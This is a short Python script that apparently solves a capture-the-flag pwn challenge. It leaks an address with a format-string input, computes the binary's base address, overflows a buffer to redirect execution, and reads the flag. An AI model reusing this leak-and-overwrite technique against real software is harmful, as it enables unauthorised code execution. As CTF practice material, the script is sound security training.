from pexpect import spawn
from struct import pack

p = spawn('/bin/bash', echo = False)
p.sendline('stty raw lnext ^- opost')
if 0:
    p.sendline('./pwn1;exit')
else:
    p.sendline('nc hax1.allesctf.net 9100;exit')
    
p.send('foo(%39$p)\n')
p.expect("foo\((.*)\)")
main = int(p.match[1].decode("utf8"), 16)
base = main & ~0xfff
print(f"main = 0x{main:x}")
print(f"base = 0x{base:x}")

payload = b'Expelliarmus' + b'\0' * 252 + pack('q', base | 0x9ed)
p.sendline(payload)
p.sendline('cat flag;exit')
p.interact()
